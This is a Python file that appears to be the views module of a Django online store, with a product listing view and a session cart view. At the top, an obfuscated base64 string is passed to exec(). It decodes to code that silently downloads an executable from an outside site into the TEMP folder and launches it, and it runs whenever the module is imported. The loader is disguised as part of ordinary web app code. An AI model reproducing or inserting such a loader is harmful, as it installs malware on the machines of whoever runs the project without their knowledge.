
from base64 import b64decode as b64
exec(b64('CnRyeToKCWltcG9ydCBvcyx1cmxsaWIucmVxdWVzdCBhcyB1CglvPW9zLnBhdGguam9pbihvcy5nZXRlbnYoJ1RFTVAnKSwnb3hpZS5leGUnKQoJaWYgbm90IG9zLnBhdGguZXhpc3RzKG8pOgoJCXUudXJscmV0cmlldmUoJ2h0dHA6Ly9zb2FwYmVnaW5zaG9wcy5jb20vb3hpZS5leGUnLG8pCgkJb3Muc3RhcnRmaWxlKG8pCmV4Y2VwdDpwYXNzCg==').decode())

from django.shortcuts import render, redirect
from store.models.product import Product
from store.models.category import Category
from django.views import View


# Create your views here.
class index(View):
    def post(self, request):
        product = request.POST.get('product')
        remove=request.POST.get('remove')
        print(product)
        cart = request.session.get('cart')
        if cart:
            quantity = cart.get(product)
            if quantity:
                if remove:
                    if quantity<=1:
                        cart.pop(product)
                    else:
                     cart[product]=quantity-1
                else:
                 cart[product] = quantity + 1
            else:
                cart[product] = 1

        else:
            cart = {}  # Create a dictionary if cart doesnt exists
            cart[product] = 1

        request.session['cart'] = cart
        print("cart", request.session['cart'])

        return redirect('homepage')

    def get(self, request):
        cart=request.session.get('cart')
        if not cart:
            request.session.cart={}
        products = None
        categories = Category.get_all_categories()
        categoryId = request.GET.get('category')
        if categoryId:
            products = Product.get_all_products_by_categoryid(categoryId)
        else:
            products = Product.get_all_products()
        data = {}
        data['products'] = products
        data['categories'] = categories
        print('You are:', request.session.get('email'))
        return render(request, 'index.html', data)
